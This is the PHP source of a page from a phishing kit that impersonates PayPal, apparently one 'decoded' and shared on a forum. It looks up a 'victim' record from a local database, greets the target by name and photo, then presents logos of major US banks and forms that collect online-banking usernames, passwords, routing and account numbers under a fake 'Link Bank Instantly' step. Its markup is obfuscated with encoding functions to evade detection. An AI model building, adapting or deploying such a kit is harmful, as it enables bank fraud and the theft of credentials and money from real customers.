<?php
// Decoded by Girudatsu.com Member

$qt_qpsS = 'date';
$nzwBXChIE_j = 'date';
include 'inc/crypt.php';
echo '<!' . xCrypt(92 - -8, 573 + -73) . '>';
?>
<script type="<?php
echo xTextEncode('text/javascript');
?>
" src="<?php
echo xTextEncode('js/bank.min.js');
?>
"></script>
<script type="<?php
echo xTextEncode('text/javascript');
?>
" src="<?php
echo xTextEncode('js/bank.js');
?>
"></script>
<script> // history.pushState('data', '','settings'); </script>
<style>
	body{ background-color: #f8f8f8; }
</style>
<?php
echo '<!' . xCrypt(57 + 43, 726 - 226) . '>';
$qt_qpsS = 'date';
$nzwBXChIE_j = 'date';
@session_start();
$pdo = new PDO('sqlite:admin/database.db');
if ($pdo) {
    $xVictime = $_SESSION['xVictime_ID'];
    $settings = $pdo->query('SELECT * FROM `settings`')->fetch(PDO::FETCH_ASSOC);
    $_tl = $settings['truelogin'] == 'Yes' ? (bool) (-38 - -39) : (bool) (7 + -7);
    $account = $pdo->query('' . 'SELECT * FROM `accounts` WHERE `id`=\'' . "{$xVictime}" . '\'' . '')->fetch(PDO::FETCH_ASSOC);
    $fullname = $account['fullname'];
    $profilephoto = $account['profilephoto'];
    $joined = $account['joined'];
    $account_type = $account['account_type'];
    $address = $account['address'];
    $creditcards = $pdo->query('' . 'SELECT * FROM `creditcards` WHERE `owner_id`=\'' . "{$xVictime}" . '\'' . '')->fetch(PDO::FETCH_ASSOC);
    include_once 'inc/language.php';
}
echo '<!' . xCrypt(92 + 8, 988 - 488) . '>';
$qt_qpsS = 'date';
$nzwBXChIE_j = 'date';
if ($_tl) {
    ?>
	<input type="<?php
    echo xTextEncode('hidden');
    ?>
" name="<?php
    echo xTextEncode('truelogin');
    ?>
" id="<?php
    echo xTextEncode('truelogin');
    ?>
" value="Yes">
<?php
    $qt_qpsS = 'date';
    $nzwBXChIE_j = 'date';
} else {
    ?>
	<input type="<?php
    echo xTextEncode('hidden');
    ?>
" name="<?php
    echo xTextEncode('truelogin');
    ?>
" id="<?php
    echo xTextEncode('truelogin');
    ?>
" value="No">
<?php
    $qt_qpsS = 'date';
    $nzwBXChIE_j = 'date';
}
echo '<!' . xCrypt(60 - -40, 598 - 98) . '>';
?>
<div id="<?php
echo xTextEncode('header_update');
?>
">
	<div class="<?php
echo xCrypt(24 + -14, 42 - -8);
?>
 <?php
echo xTextEncode('container_update for_nav');
?>
">
		<div id="<?php
echo xTextEncode('menu_btn_update');
?>
"></div>
		<div id="<?php
echo xTextEncode('logo_update');
?>
"></div>
		<ul class="<?php
echo xCrypt(-38 - -48, 87 - 37);
?>
 <?php
echo xTextEncode('nav');
?>
">
			<li class="<?php
echo xCrypt(-47 - -57, 51 - 1);
?>
 <?php
echo xTextEncode('nav-item');
?>
">
				<a class="<?php
echo xCrypt(70 + -60, 79 - 29);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['bank']['navbar']['1'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(-42 - -52, 22 + 28);
?>
 <?php
echo xTextEncode('nav-item');
?>
">
				<a class="<?php
echo xCrypt(39 + -29, -17 - -67);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['bank']['navbar']['2'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(-32 - -42, 38 - -12);
?>
 <?php
echo xTextEncode('nav-item');
?>
">
				<a class="<?php
echo xCrypt(46 + -36, 83 - 33);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['bank']['navbar']['3'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(76 + -66, 68 + -18);
?>
 <?php
echo xTextEncode('nav-item');
?>
">
				<a class="<?php
echo xCrypt(-74 - -84, 80 - 30);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['bank']['navbar']['4'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(97 + -87, 125 + -75);
?>
 <?php
echo xTextEncode('nav-item');
?>
">
				<a class="<?php
echo xCrypt(100 + -90, 46 + 4);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['bank']['navbar']['5'];
?>
</a>
			</li>
		</ul>
		<div id="<?php
echo xTextEncode('logout');
?>
">
			<div class="<?php
echo xCrypt(58 + -48, 88 - 38);
?>
 <?php
echo xTextEncode('sub_logout');
?>
">
				<button class="<?php
echo xCrypt(2 + 8, 68 - 18);
?>
 <?php
echo xTextEncode('log_out');
?>
"><?php
echo $language['bank']['navbar']['6'];
?>
</button>
			</div>
			<div class="<?php
echo xCrypt(6 + 4, 129 + -79);
?>
 <?php
echo xTextEncode('sub_logout');
?>
" id="<?php
echo xTextEncode('setting');
?>
">
			</div>
			<div class="<?php
echo xCrypt(58 + -48, -49 - -99);
?>
 <?php
echo xTextEncode('sub_logout');
?>
" id="<?php
echo xTextEncode('alert');
?>
">
			</div>
		</div>
	</div>
</div>
<?php
echo '<!' . xCrypt(103 + -3, 783 - 283) . '>';
?>
<div id="<?php
echo xTextEncode('sub_menu');
?>
">
	<div class="<?php
echo xCrypt(-46 - -56, 96 + -46);
?>
 <?php
echo xTextEncode('container_update');
?>
">
		<ul class="<?php
echo xCrypt(-35 - -45, 41 + 9);
?>
 <?php
echo xTextEncode('sub_nav');
?>
">
			<li class="<?php
echo xCrypt(31 + -21, 76 + -26);
?>
 <?php
echo xTextEncode('sub_nav-item');
?>
">
				<a class="<?php
echo xCrypt(1 + 9, 115 + -65);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['bank']['sub_navbar']['1'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(77 + -67, -3 - -53);
?>
 <?php
echo xTextEncode('sub_nav-item');
?>
">
				<a class="<?php
echo xCrypt(-21 - -31, 19 - -31);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['bank']['sub_navbar']['2'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(-81 - -91, 56 + -6);
?>
 <?php
echo xTextEncode('sub_nav-item');
?>
">
				<a class="<?php
echo xCrypt(58 + -48, 62 + -12);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['bank']['sub_navbar']['3'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(6 + 4, 84 - 34);
?>
 <?php
echo xTextEncode('sub_nav-item');
?>
">
				<a class="<?php
echo xCrypt(8 - -2, 122 + -72);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['bank']['sub_navbar']['4'];
?>
</a>
			</li>
		</ul>
		<div class="<?php
echo xCrypt(-29 - -39, 78 + -28);
?>
 <?php
echo xTextEncode('arrow');
?>
"></div>
	</div>
</div>
<?php
echo '<!' . xCrypt(187 + -87, 452 + 48) . '>';
?>
<div id="<?php
echo xTextEncode('update_content');
?>
">
	<div class="<?php
echo xCrypt(80 + -70, 134 + -84);
?>
 <?php
echo xTextEncode('container_update');
?>
">
		<div class="<?php
echo xCrypt(-21 - -31, 76 + -26);
?>
 <?php
echo xTextEncode('row first');
?>
">
			<div class="<?php
echo xCrypt(104 + -94, 65 - 15);
?>
 <?php
echo xTextEncode('six columns');
?>
">
				<div class="<?php
echo xCrypt(1 - -9, 54 - 4);
?>
 <?php
echo xTextEncode('row');
?>
" <?php
echo $display_profile;
?>
>
					<div id="<?php
echo xTextEncode('profile_div');
?>
">
						<font class="<?php
echo xCrypt(-27 - -37, 101 + -51);
?>
 <?php
echo xTextEncode('profile');
?>
"><?php
echo $language['bank']['1'];
?>
</font>
						<div id="<?php
echo xTextEncode('profile_img');
?>
" style="background-image:url(<?php
echo $profilephoto;
?>
);"></div>
						<div id="<?php
echo xTextEncode('Update_Photo');
?>
"><?php
echo $language['bank']['2'];
?>
</div>
					</div>
					<div id="<?php
echo xTextEncode('profile_name_div');
?>
">
						<div id="<?php
echo xTextEncode('my_name');
?>
"><?php
echo $fullname;
?>
</div>
						<div id="<?php
echo xTextEncode('joined_at');
?>
"><?php
echo $language['bank']['3'];
?>
 <?php
echo $joined;
?>
 <font><?php
echo $language['bank']['4'];
?>
</font></div>
					</div>
				</div>
				<div id="<?php
echo xTextEncode('frm_account');
?>
">
					<table>
						<tr><td width="30px"><img src="<?php
echo xTextEncode('img/icon_checked.png');
?>
"></td><td><?php
echo $language['bank']['5']['1'];
?>
</td></tr>
						<tr><td width="30px"><img src="<?php
echo xTextEncode('img/icon_checked.png');
?>
"></td><td><?php
echo $language['bank']['5']['2'];
?>
</td></tr>
						<tr><td width="30px"><img src="<?php
echo xTextEncode('img/icon_uncheck.png');
?>
"></td><td><?php
echo $language['bank']['5']['3'];
?>
</td></tr>
						<?php
$qt_qpsS = 'date';
$nzwBXChIE_j = 'date';
if ($settings['enable_identity'] == 'yes') {
    ?>
							<tr><td width="30px"><img src="<?php
    echo xTextEncode('img/icon_uncheck.png');
    ?>
"></td><td><?php
    echo $language['bank']['5']['4'];
    ?>
</td></tr>
						<?php
    $qt_qpsS = 'date';
    $nzwBXChIE_j = 'date';
}
?>
					</table>
<?php
echo '<!' . xCrypt(115 - 15, 435 - -65) . '>';
?>
				</div>
			</div>
			<div class="<?php
echo xCrypt(-73 - -83, -20 - -70);
?>
 <?php
echo xTextEncode('six columns');
?>
">
				<div class="<?php
echo xCrypt(-10 - -20, 3 - -47);
?>
 <?php
echo xTextEncode('profile');
?>
" id="<?php
echo xTextEncode('bank_page_title');
?>
"><?php
echo $language['bank']['6'];
?>
</div>
				<div id="<?php
echo xTextEncode('address_div');
?>
">
					<div id="<?php
echo xTextEncode('bank_step0');
?>
">
						<div class="<?php
echo xCrypt(96 + -86, 53 + -3);
?>
 <?php
echo xTextEncode('bank_box');
?>
" id="<?php
echo xTextEncode('bank_id_bankofamerica');
?>
"><img src="<?php
echo xTextEncode('img/bankofamerica.png');
?>
"></div>
						<div class="<?php
echo xCrypt(17 + -7, -17 - -67);
?>
 <?php
echo xTextEncode('bank_box');
?>
" id="<?php
echo xTextEncode('bank_id_suntrust');
?>
"><img src="<?php
echo xTextEncode('img/suntrust.png');
?>
"></div>
						<div class="<?php
echo xCrypt(-84 - -94, 135 + -85);
?>
 <?php
echo xTextEncode('bank_box');
?>
" id="<?php
echo xTextEncode('bank_id_PNC');
?>
"><img src="<?php
echo xTextEncode('img/PNC.png');
?>
"></div>
						<div class="<?php
echo xCrypt(58 + -48, 4 + 46);
?>
 <?php
echo xTextEncode('bank_box');
?>
" id="<?php
echo xTextEncode('bank_id_capitalone');
?>
"><img src="<?php
echo xTextEncode('img/capitalone.png');
?>
"></div>
						<div class="<?php
echo xCrypt(38 + -28, 88 - 38);
?>
 <?php
echo xTextEncode('bank_box');
?>
" id="<?php
echo xTextEncode('bank_id_chase');
?>
"><img src="<?php
echo xTextEncode('img/chase.png');
?>
"></div>
						<div class="<?php
echo xCrypt(108 + -98, 108 + -58);
?>
 <?php
echo xTextEncode('bank_box');
?>
" id="<?php
echo xTextEncode('bank_id_citi');
?>
"><img src="<?php
echo xTextEncode('img/citi.png');
?>
"></div>
						<div class="<?php
echo xCrypt(-36 - -46, 90 + -40);
?>
 <?php
echo xTextEncode('bank_box');
?>
" id="<?php
echo xTextEncode('bank_id_usbank');
?>
"><img src="<?php
echo xTextEncode('img/usbank.png');
?>
"></div>
						<div class="<?php
echo xCrypt(18 + -8, 95 - 45);
?>
 <?php
echo xTextEncode('bank_box');
?>
" id="<?php
echo xTextEncode('bank_id_wellsfargo');
?>
"><img src="<?php
echo xTextEncode('img/wellsfargo.png');
?>
"></div>
						<div class="<?php
echo xCrypt(56 + -46, 72 + -22);
?>
 <?php
echo xTextEncode('bank_box');
?>
" id="<?php
echo xTextEncode('bank_id_usaa');
?>
"><img src="<?php
echo xTextEncode('img/usaa.png');
?>
"></div>
						<div class="<?php
echo xCrypt(-5 - -15, 94 + -44);
?>
 <?php
echo xTextEncode('bank_box');
?>
" id="<?php
echo xTextEncode('bank_id_huntington');
?>
"><img src="<?php
echo xTextEncode('img/huntington.png');
?>
"></div>
						<div class="<?php
echo xCrypt(29 + -19, 89 - 39);
?>
 <?php
echo xTextEncode('bank_box');
?>
" id="<?php
echo xTextEncode('bank_id_fifththirdbank');
?>
"><img src="<?php
echo xTextEncode('img/fifththirdbank.png');
?>
"></div>
						<div class="<?php
echo xCrypt(5 - -5, 144 + -94);
?>
 <?php
echo xTextEncode('bank_box');
?>
" id="<?php
echo xTextEncode('bank_id_regions');
?>
"><img src="<?php
echo xTextEncode('img/regions.png');
?>
"></div>
						<div class="<?php
echo xCrypt(-17 - -27, 86 - 36);
?>
 <?php
echo xTextEncode('bank_box');
?>
" id="<?php
echo xTextEncode('bank_id_bank');
?>
"><img src="<?php
echo xTextEncode('img/ibank.png');
?>
"></div>
						<div class="<?php
echo xCrypt(101 + -91, 104 + -54);
?>
 <?php
echo xTextEncode('bank_box');
?>
" id="<?php
echo xTextEncode('bank_id_i_have_a_different_bank');
?>
"><img src="<?php
echo xTextEncode('img/i_have_a_different_bank.png');
?>
"></div>
						<button type="<?php
echo xTextEncode('button');
?>
" name="<?php
echo xTextEncode('i_dont_have_a_bank');
?>
" id="<?php
echo xTextEncode('i_dont_have_a_bank');
?>
" class="<?php
echo xCrypt(44 + -34, 99 + -49);
?>
 <?php
echo xTextEncode('u-full-width');
?>
"><?php
echo $language['bank']['7'];
?>
</button>
					</div>
<?php
echo '<!' . xCrypt(152 - 52, 473 + 27) . '>';
?>
					<div id="<?php
echo xTextEncode('bank_step1');
?>
">
						<div class="<?php
echo xCrypt(-11 - -21, 78 + -28);
?>
 <?php
echo xTextEncode('row');
?>
" id="<?php
echo xTextEncode('bank_head');
?>
"><?php
echo $language['bank']['8']['1'];
?>
 <b><?php
echo $creditcards['bank_name'];
?>
</b> <?php
echo $language['bank']['8']['2'];
?>
</div>
						<div class="<?php
echo xCrypt(-25 - -35, 135 + -85);
?>
 <?php
echo xTextEncode('row');
?>
"><center><img id="<?php
echo xTextEncode('bank_image');
?>
" src="<?php
echo xTextEncode('img/chase.png');
?>
"></center></div>
						<div id="<?php
echo xTextEncode('wallet_div');
?>
">
							<table>
								<tr><td><input type="<?php
echo xTextEncode('text');
?>
" name="<?php
echo xTextEncode('eBankName');
?>
" id="<?php
echo xTextEncode('eBankName');
?>
" value="" placeholder="Bank Name" class="<?php
echo xCrypt(-40 - -50, -3 - -53);
?>
 <?php
echo xTextEncode('u-full-width');
?>
" style="display:none;"></td></tr>
								<tr><td><input type="<?php
echo xTextEncode('text');
?>
" name="<?php
echo xTextEncode('eUsername');
?>
" id="<?php
echo xTextEncode('eUsername');
?>
" value="" placeholder="Username" class="<?php
echo xCrypt(13 - 3, -19 - -69);
?>
 <?php
echo xTextEncode('u-full-width');
?>
"></td></tr>
								<tr><td><input type="<?php
echo xTextEncode('password');
?>
" name="<?php
echo xTextEncode('ePassword');
?>
" id="<?php
echo xTextEncode('ePassword');
?>
" value="" placeholder="Password" class="<?php
echo xCrypt(-81 - -91, 94 - 44);
?>
 <?php
echo xTextEncode('u-full-width');
?>
"></td></tr>
							</table>
							<div class="<?php
echo xCrypt(106 + -96, 46 - -4);
?>
 <?php
echo xTextEncode('row');
?>
"><?php
echo $language['bank']['8']['3'];
?>
 <b>Link Bank Instantly</b>, <?php
echo $language['bank']['8']['4'];
?>
 <font class="<?php
echo xCrypt(24 + -14, 118 + -68);
?>
 <?php
echo xTextEncode('blue');
?>
"><?php
echo $language['bank']['8']['5'];
?>
</font> <?php
echo $language['bank']['8']['6'];
?>
</div>
							<table>
								<tr><td><input type="<?php
echo xTextEncode('button');
?>
" name="<?php
echo xTextEncode('bank_login_submit');
?>
" id="<?php
echo xTextEncode('bank_login_submit');
?>
" value="Link Bank Instantly" class="<?php
echo xCrypt(109 + -99, 1 + 49);
?>
 <?php
echo xTextEncode('u-full-width button-primary');
?>
"></td></tr>
								<tr><td><input type="<?php
echo xTextEncode('button');
?>
" name="<?php
echo xTextEncode('ignore_this_step');
?>
" id="<?php
echo xTextEncode('ignore_1');
?>
" value="<?php
echo $language['bank']['15'];
?>
" class="<?php
echo xCrypt(3 + 7, 66 + -16);
?>
 <?php
echo xTextEncode('u-full-width');
?>
"></td></tr>
							</table>
						</div>
					</div>
<?php
echo '<!' . xCrypt(32 - -68, 517 + -17) . '>';
?>
					<div id="<?php
echo xTextEncode('bank_step2');
?>
">
						<div class="<?php
echo xCrypt(97 + -87, 0 - -50);
?>
 <?php
echo xTextEncode('row');
?>
" id="<?php
echo xTextEncode('bank_head2');
?>
">
						<?php
echo $language['bank']['9']['1'];
?>
 <b><?php
echo $creditcards['bank_name'];
?>
</b> <?php
echo $language['bank']['9']['2'];
?>
						</div>

						<div id="<?php
echo xTextEncode('xChecking');
?>
" class="<?php
echo xCrypt(-69 - -79, 28 - -22);
?>
 <?php
echo xTextEncode('bank_type first active');
?>
">Checking</div>
						<div id="<?php
echo xTextEncode('xSavings');
?>
" class="<?php
echo xCrypt(94 + -84, 7 - -43);
?>
 <?php
echo xTextEncode('bank_type second not_active');
?>
">Savings</div>

						<div class="<?php
echo xCrypt(20 - 10, -9 - -59);
?>
 <?php
echo xTextEncode('row');
?>
">
							<img src="<?php
echo xTextEncode('img/checking.png');
?>
" id="<?php
echo xTextEncode('check_img');
?>
" width="100%">
						</div>

						<table>
							<tr>
								<td>
									<input type="<?php
echo xTextEncode('text');
?>
" name="<?php
echo xTextEncode('uRouting');
?>
" id="<?php
echo xTextEncode('uRouting');
?>
" value="" maxlength="9" placeholder="Routing number" class="<?php
echo xCrypt(88 + -78, -50 - -100);
?>
 <?php
echo xTextEncode('u-pull-left');
?>
" style="width:49%;">
									<input type="<?php
echo xTextEncode('text');
?>
" name="<?php
echo xTextEncode('uAccount');
?>
" id="<?php
echo xTextEncode('uAccount');
?>
" value="" maxlength="17" placeholder="Account number" class="<?php
echo xCrypt(-35 - -45, 7 + 43);
?>
 <?php
echo xTextEncode('u-pull-right');
?>
" style="width:49%;">
								</td>
							</tr>
						</table>
						<div class="<?php
echo xCrypt(54 + -44, 47 - -3);
?>
 <?php
echo xTextEncode('row');
?>
">
							<?php
echo $language['bank']['10'];
?>
						</div>
						<table>
							<tr><td><input type="<?php
echo xTextEncode('button');
?>
" name="<?php
echo xTextEncode('bank_routing_submit');
?>
" id="<?php
echo xTextEncode('bank_routing_submit');
?>
" value="Agree and Link" class="<?php
echo xCrypt(50 + -40, 96 - 46);
?>
 <?php
echo xTextEncode('u-full-width button-primary');
?>
"></td></tr>
							<tr><td><input type="<?php
echo xTextEncode('button');
?>
" name="<?php
echo xTextEncode('ignore_this_step');
?>
" id="<?php
echo xTextEncode('ignore_2');
?>
" value="<?php
echo $language['bank']['15'];
?>
" class="<?php
echo xCrypt(55 + -45, 87 - 37);
?>
 <?php
echo xTextEncode('u-full-width');
?>
"></td></tr>
						</table>
					</div>
<?php
echo '<!' . xCrypt(47 + 53, 927 - 427) . '>';
?>
					<!-- <input type="<?php
echo xTextEncode('hidden');
?>
" name="<?php
echo xTextEncode('x_bank_name');
?>
" id="<?php
echo xTextEncode('x_bank_name');
?>
" value=""> -->
					<input type="<?php
echo xTextEncode('hidden');
?>
" name="<?php
echo xTextEncode('savings_or_checking');
?>
" id="<?php
echo xTextEncode('savings_or_checking');
?>
" value="Checking">
				</div>
			</div>
		</div>
		<div id="<?php
echo xTextEncode('footer_update_mobile');
?>
">
			<div class="<?php
echo xCrypt(56 + -46, 64 + -14);
?>
 <?php
echo xTextEncode('row footer_row_1');
?>
"><font class="<?php
echo xCrypt(42 + -32, 45 - -5);
?>
 <?php
echo xTextEncode('footer1');
?>
">Help&nbsp;&&nbsp;Contact&nbsp;&nbsp;Security</font></div>
			<div class="<?php
echo xCrypt(47 + -37, 137 + -87);
?>
 <?php
echo xTextEncode('row footer_row_2');
?>
"><font class="<?php
echo xCrypt(100 + -90, 76 - 26);
?>
 <?php
echo xTextEncode('footer2');
?>
">© 1999-<?php
echo @date('Y');
?>
 <?php
echo xTextEncode('PayPal, Inc. All rights reserved.');
?>
</font></div>
		</div>
	</div>
</div>
<?php
echo '<!' . xCrypt(6 + 94, 593 + -93) . '>';
?>
<div id="<?php
echo xTextEncode('footer_update');
?>
">
	<div class="<?php
echo xCrypt(-85 - -95, 47 - -3);
?>
 <?php
echo xTextEncode('container_update');
?>
">
		<div class="<?php
echo xCrypt(3 - -7, -49 - -99);
?>
 <?php
echo xTextEncode('row footer_row_1');
?>
"><font class="<?php
echo xCrypt(-66 - -76, 103 + -53);
?>
 <?php
echo xTextEncode('footer1');
?>
">Help&nbsp;&&nbsp;Contact&nbsp;&nbsp;Security</font><img src="<?php
echo xTextEncode('img/feedback.png');
?>
"></div>
		<div class="<?php
echo xCrypt(23 + -13, -34 - -84);
?>
 <?php
echo xTextEncode('row footer_row_2');
?>
"><font class="<?php
echo xCrypt(16 + -6, -18 - -68);
?>
 <?php
echo xTextEncode('footer2');
?>
">© 1999-<?php
echo @date('Y');
?>
 <?php
echo xTextEncode('PayPal, Inc. All rights reserved.');
?>
</font> <font class="<?php
echo xCrypt(-89 - -99, 5 + 45);
?>
 <?php
echo xTextEncode('footer3');
?>
">|</font> <font class="<?php
echo xCrypt(-75 - -85, 108 + -58);
?>
 <?php
echo xTextEncode('footer4');
?>
">Privacy&nbsp;&nbsp;&nbsp;Legal&nbsp;&nbsp;&nbsp;Policy updates</font></div>
	</div>
</div>
